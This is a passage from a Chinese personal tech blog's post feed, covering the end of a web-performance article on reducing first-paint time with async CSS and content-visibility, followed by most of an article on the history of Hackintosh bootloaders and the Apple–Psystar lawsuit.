3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 